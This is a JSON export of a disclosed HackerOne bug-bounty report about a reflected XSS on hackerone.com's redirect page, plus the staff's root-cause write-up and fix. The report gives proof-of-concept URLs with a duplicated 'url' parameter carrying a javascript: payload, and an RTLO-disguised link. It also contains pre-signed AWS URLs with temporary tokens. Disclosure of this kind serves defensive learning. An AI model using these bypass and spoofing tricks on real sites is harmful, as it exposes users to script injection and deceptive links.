@@ -1,0 +1,437 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-11-30T06:09:18.755Z", 
+    "voters": [
+        "jokebookservice1", 
+        "flamezzz", 
+        "michiel", 
+        "bl4de", 
+        "secator", 
+        "foobar7", 
+        "jr0ch17", 
+        "europa", 
+        "jensec", 
+        "hunter", 
+        "and 49 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "1500.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 293689, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-11-29T23:57:43.801Z", 
+    "vulnerability_information": "Hello hackerone team\n\nI want to report I bypass w/c lead to XSS (but limited only for IE) due to CSP block on chrome\n\nHere is the POC\n------------------\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=JAVASCRIPT:alert%09(document.domain)\n```\n\nHow I find this issue\n-----------------------\nFirst I notice that before you will redirect to other site hackerone will notify users that they are being redirected to other website\nHere is example\n------------------\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me\n```\nBut when you change the url it will not match to the signature (h1 alers) by you can bypass it by adding &url\nso it would look like this\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=\n```\nNow I try doing this to trigger XSS\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=JAVASCRIPT:alert%09(document.domain)\n```\ndue to CSP protection I was not able to trigger XSS (My bypass skills on CSP is not good enought :-( )\nBut in IE it works :-)\n\nI beleive that this is an issue\n\nMinor RTLO that can treak users\n------------------------------------\nAnd another things is I try to do a RTLO on the URL (But because it has filter alert I dont know if this will trigger your interest)\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&url=http%3A%2F%2Fbuglabs.me&url=http%3A%2F%2F%09%E2%80%AEmoc.enorekcah\n```\n\nTested\n-------\nIE11 - for XSS\nChrome, Mozilla - for RTLO\n\n\nAdvance Merry Christmas guys :-)\n\nCheers\nKenziy\n\n## Impact\n\nTrick user or trigger malicious script", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "low", 
+            "privileges_required": "low", 
+            "user_interaction": "required", 
+            "attack_vector": "network", 
+            "attack_complexity": "high", 
+            "scope": "unchanged", 
+            "integrity": "low", 
+            "availability": "none"
+        }, 
+        "rating": "medium", 
+        "score": 4.8, 
+        "author_type": "Team"
+    }, 
+    "title": "Query parameter reordering causes redirect page to render unsafe URL", 
+    "is_member_of_team?": null, 
+    "vote_count": 59, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 5986, 
+            "content": "@kenziy found a reflected Cross-Site Scripting (XSS) vulnerability that was exploitable in Internet Explorer due to the CSP being ignored. The root cause of the vulnerability was rather interesting. In production, we had \"Query String Sort\" enabled in the Cloudflare caching settings. This is why we couldn't reproduce the same behavior in our local development environments. When Cloudflare sorted the `url` parameters, it placed the last `url` parameter (with the XSS payload) first because `J` (capital) comes before the `h` in the ASCII table. We noticed that the application load balancer (ALB) on AWS received the attributes in ascending order. The reason why this recently became a vulnerability, is because the app is now rendering the external link warning in React. Here's a step-by-step description what happened:\n\n1. user submits request with `url=http://test.com` and `url=JAVASCRIPT:some-payload` (in that order)\n2. Cloudflare reorders the parameters to `url=JAVASCRIPT:some-payload` and `url=http://test.com`\n3. ALB and nginx dispatch the request to unicorn\n4. unicorn uses the last `url` in the parameter, which matches the passed signature in the URL\n5. unicorn responds with a 200 OK and renders a container to load the React application\n6. React grabs the `url` from the query parameters, which, for the browser, is still `url=JAVASCRIPT:some-payload`, not `url=http://test.com`\n7. React parses the URL and renders the XSS payload\n\nThe vulnerability was addressed by disabling the setting in Cloudflare. We want to thank @kenziy for bringing this to our attention, this was a great find!", 
+            "content_html": "<p><a href=\"/kenziy\">@kenziy</a> found a reflected Cross-Site Scripting (XSS) vulnerability that was exploitable in Internet Explorer due to the CSP being ignored. The root cause of the vulnerability was rather interesting. In production, we had &quot;Query String Sort&quot; enabled in the Cloudflare caching settings. This is why we couldn&#39;t reproduce the same behavior in our local development environments. When Cloudflare sorted the <code>url</code> parameters, it placed the last <code>url</code> parameter (with the XSS payload) first because <code>J</code> (capital) comes before the <code>h</code> in the ASCII table. We noticed that the application load balancer (ALB) on AWS received the attributes in ascending order. The reason why this recently became a vulnerability, is because the app is now rendering the external link warning in React. Here&#39;s a step-by-step description what happened:</p>\n\n<ol>\n<li>user submits request with <code>url=http://test.com</code> and <code>url=JAVASCRIPT:some-payload</code> (in that order)</li>\n<li>Cloudflare reorders the parameters to <code>url=JAVASCRIPT:some-payload</code> and <code>url=http://test.com</code>\n</li>\n<li>ALB and nginx dispatch the request to unicorn</li>\n<li>unicorn uses the last <code>url</code> in the parameter, which matches the passed signature in the URL</li>\n<li>unicorn responds with a 200 OK and renders a container to load the React application</li>\n<li>React grabs the <code>url</code> from the query parameters, which, for the browser, is still <code>url=JAVASCRIPT:some-payload</code>, not <code>url=http://test.com</code>\n</li>\n<li>React parses the URL and renders the XSS payload</li>\n</ol>\n\n<p>The vulnerability was addressed by disabling the setting in Cloudflare. We want to thank <a href=\"/kenziy\">@kenziy</a> for bringing this to our attention, this was a great find!</p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "https://hackerone.com", 
+        "max_severity": "critical", 
+        "databaseId": 3, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2017-12-29T23:57:44.007Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$1,500", 
+    "attachments": [
+        {
+            "file_name": "xss.png", 
+            "type": "image/png", 
+            "id": 243030, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/243/030/5d8b4cc0864834cd468cb0c93bdaad533cbc0136/xss.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222909Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ddebb1e69422db844b6477e4f50ed30af9134cb26943dd5fa8746fdf7c11295"
+        }, 
+        {
+            "file_name": "RTLO.png", 
+            "type": "image/png", 
+            "id": 243031, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/243/031/08876832644474bef2cbe976c75a08b021b0de92/RTLO.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222909Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=13ae20529a7ac04b350ef212ec9b6159450da44d5de03003568b91d935efcec1"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-29T11:12:53.138Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T11:12:53.138Z", 
+            "actor": {
+                "username": "kenziy", 
+                "url": "/kenziy", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/138/828/547e0d51181d99fe8acdd3ffa30252b8fb492773_medium.jpg?1539183774"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Hello HackerOne Security Team\n\nReproducible: YES\nImpact: I believe this may harm users\nIn Scope: YES", 
+            "markdown_message": "<p>Hello HackerOne Security Team</p>\n\n<p>Reproducible: YES<br>\nImpact: I believe this may harm users<br>\nIn Scope: YES</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2188446, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-29T19:13:21.991Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T19:13:21.991Z", 
+            "actor": {
+                "username": "nahamsec", 
+                "url": "/nahamsec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Hey @kenziy - Thank you for your report. We are currently looking into this report and we'll notify you once we have more information to share with you. Thanks! ", 
+            "markdown_message": "<p>Hey <a href=\"/kenziy\">@kenziy</a> - Thank you for your report. We are currently looking into this report and we&#39;ll notify you once we have more information to share with you. Thanks! </p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2189592, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-11-29T19:29:22.311Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T19:29:22.311Z", 
+            "actor": {
+                "url": "/security", 
+                "profile": {
+                    "name": "HackerOne"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
+                }
+            }, 
+            "team_handle": "security", 
+            "bonus_amount": "250.0", 
+            "bounty_amount": "1250.0", 
+            "collaborator": {
+                "username": "kenziy", 
+                "url": "/kenziy"
+            }, 
+            "message": "Hey @kenziy - We are working on a fix for this issue. In the meanwhile, we have decided to assign a $1,250 bounty for the XSS and RTLO issues with an additional $250 bonus for the well written and creative submission.\n\nHappy hacking! ", 
+            "markdown_message": "<p>Hey <a href=\"/kenziy\">@kenziy</a> - We are working on a fix for this issue. In the meanwhile, we have decided to assign a $1,250 bounty for the XSS and RTLO issues with an additional $250 bonus for the well written and creative submission.</p>\n\n<p>Happy hacking! </p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2189632, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-29T19:31:10.605Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T19:31:10.605Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Medium (4.8)", 
+                "old_severity": "Low"
+            }, 
+            "team_handle": "security", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2189643, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/243/193/3b54edc8b66adaf68d1914a0c71201cfe282164b/Screen_Shot_2017-11-29_at_3.38.32_PM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222909Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=26cad3afeaf48a7a043c435a909be7300d795f14703d142be9b8dd6a4ab7b5f5", 
+                    "type": "image/png", 
+                    "id": 243193, 
+                    "filename": "Screen_Shot_2017-11-29_at_3.38.32_PM.png"
+                }
+            ], 
+            "automated_response": false, 
+            "reporter": {
+                "username": "kenziy", 
+                "url": "/kenziy"
+            }, 
+            "created_at": "2017-11-29T23:49:42.822Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T23:49:42.822Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Hi @kenziy - thanks again for bringing this to our attention. We believe the vulnerability has been addressed. The root cause of the vulnerability was rather interesting. In production, we had \"Query String Sort\" enabled in the Cloudflare caching settings. This is why we couldn't reproduce the same behavior in our local development environments. When Cloudflare sorted the `url` parameters, it placed the last `url` parameter (with the XSS payload) first because `J` (capital) comes before the `h` in the ASCII table. We noticed that the application load balancer (ALB) on AWS received the attributes in ascending order. We were able to confirm a similar behavior with other endpoints on hackerone.com. We fixed the vulnerability by disabling the setting in Cloudflare. Thanks again for bringing this to our attention, good find!\n\n{F243193}\n\nJobert", 
+            "markdown_message": "<p>Hi <a href=\"/kenziy\">@kenziy</a> - thanks again for bringing this to our attention. We believe the vulnerability has been addressed. The root cause of the vulnerability was rather interesting. In production, we had &quot;Query String Sort&quot; enabled in the Cloudflare caching settings. This is why we couldn&#39;t reproduce the same behavior in our local development environments. When Cloudflare sorted the <code>url</code> parameters, it placed the last <code>url</code> parameter (with the XSS payload) first because <code>J</code> (capital) comes before the <code>h</code> in the ASCII table. We noticed that the application load balancer (ALB) on AWS received the attributes in ascending order. We were able to confirm a similar behavior with other endpoints on hackerone.com. We fixed the vulnerability by disabling the setting in Cloudflare. Thanks again for bringing this to our attention, good find!</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-11-29_at_3.38.32_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/243/193/3b54edc8b66adaf68d1914a0c71201cfe282164b/Screen_Shot_2017-11-29_at_3.38.32_PM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222909Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=26cad3afeaf48a7a043c435a909be7300d795f14703d142be9b8dd6a4ab7b5f5\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/243/193/3b54edc8b66adaf68d1914a0c71201cfe282164b/Screen_Shot_2017-11-29_at_3.38.32_PM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222909Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=26cad3afeaf48a7a043c435a909be7300d795f14703d142be9b8dd6a4ab7b5f5\" class=\"markdown-inline-image\"></a></p>\n\n<p>Jobert</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2190149, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-29T23:57:43.835Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T23:57:43.835Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2190158, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-30T00:21:57.752Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-30T00:21:57.752Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_title": "Query parameter reordering causes redirect page to render unsafe URL", 
+                "old_title": "Redirection filter bypass leading to XSS"
+            }, 
+            "team_handle": "security", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 2190180, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-30T06:09:00.357Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-30T06:09:00.357Z", 
+            "actor": {
+                "username": "kenziy", 
+                "url": "/kenziy", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/138/828/547e0d51181d99fe8acdd3ffa30252b8fb492773_medium.jpg?1539183774"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Oh? I see thanks @jobert  and also @nahamsec for handling my report it was very awesome experience :-)\n\nThank you for the bounty!", 
+            "markdown_message": "<p>Oh? I see thanks <a href=\"/jobert\">@jobert</a>  and also <a href=\"/nahamsec\">@nahamsec</a> for handling my report it was very awesome experience :-)</p>\n\n<p>Thank you for the bounty!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2190460, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-30T06:09:18.796Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-30T06:09:18.796Z", 
+            "actor": {
+                "username": "kenziy", 
+                "url": "/kenziy", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/138/828/547e0d51181d99fe8acdd3ffa30252b8fb492773_medium.jpg?1539183774"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2190461, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-30T06:09:18.912Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-30T06:09:18.912Z", 
+            "actor": {
+                "username": "kenziy", 
+                "url": "/kenziy", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/138/828/547e0d51181d99fe8acdd3ffa30252b8fb492773_medium.jpg?1539183774"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2190462, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-30T06:34:21.367Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-30T06:34:21.367Z", 
+            "actor": {
+                "username": "kenziy", 
+                "url": "/kenziy", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/138/828/547e0d51181d99fe8acdd3ffa30252b8fb492773_medium.jpg?1539183774"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "guys is this valid for swag? :-)", 
+            "markdown_message": "<p>guys is this valid for swag? :-)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2190481, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "kenziy", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/kenziy", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/138/828/39b824b31e1dd7504789a262388e2d5f9fd31281_small.jpg?1539183774"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 61, 
+        "name": "Cross-site Scripting (XSS) - Reflected"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -29543485.254703406, 
+    "disclosed_at": "2017-11-30T06:09:18.879Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/293689", 
+    "created_at": "2017-11-29T11:11:24.220Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hello hackerone team</p>\n\n<p>I want to report I bypass w/c lead to XSS (but limited only for IE) due to CSP block on chrome</p>\n\n<h2 id=\"here-is-the-poc\">Here is the POC</h2>\n<pre class=\"highlight plaintext\"><code>https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&amp;url=http%3A%2F%2Fbuglabs.me&amp;url=JAVASCRIPT:alert%09(document.domain)\n</code></pre>\n<h2 id=\"how-i-find-this-issue\">How I find this issue</h2>\n\n<p>First I notice that before you will redirect to other site hackerone will notify users that they are being redirected to other website</p>\n\n<h2 id=\"here-is-example\">Here is example</h2>\n<pre class=\"highlight plaintext\"><code>https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&amp;url=http%3A%2F%2Fbuglabs.me\n</code></pre>\n<p>But when you change the url it will not match to the signature (h1 alers) by you can bypass it by adding &amp;url<br>\nso it would look like this</p>\n<pre class=\"highlight plaintext\"><code>https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&amp;url=http%3A%2F%2Fbuglabs.me&amp;url=\n</code></pre>\n<p>Now I try doing this to trigger XSS</p>\n<pre class=\"highlight plaintext\"><code>https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&amp;url=http%3A%2F%2Fbuglabs.me&amp;url=JAVASCRIPT:alert%09(document.domain)\n</code></pre>\n<p>due to CSP protection I was not able to trigger XSS (My bypass skills on CSP is not good enought :-( 